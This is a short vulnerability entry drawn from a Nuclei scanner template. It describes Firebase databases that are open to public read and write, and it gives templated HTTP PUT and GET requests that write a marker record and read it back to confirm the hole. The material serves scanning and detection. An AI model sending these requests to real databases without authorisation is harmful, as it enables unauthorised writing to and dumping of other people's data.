# Vulnerability: Insecure Firebase Database
**Classification:** FIREBASE
**Source:** Nuclei Template (`insecure-firebase-database.yaml`)

## Description
If the owner of the app have set the security rules as true for both "read" & "write" an attacker can probably dump database and write his own data to firebase database.

## Vulnerable Code Pattern / Exploit Payload
```http
PUT /{{randstr}}.json HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id":"insecure-firebase-database"}

GET /{{randstr}}.json HTTP/1.1
Host: {{Hostname}}
```

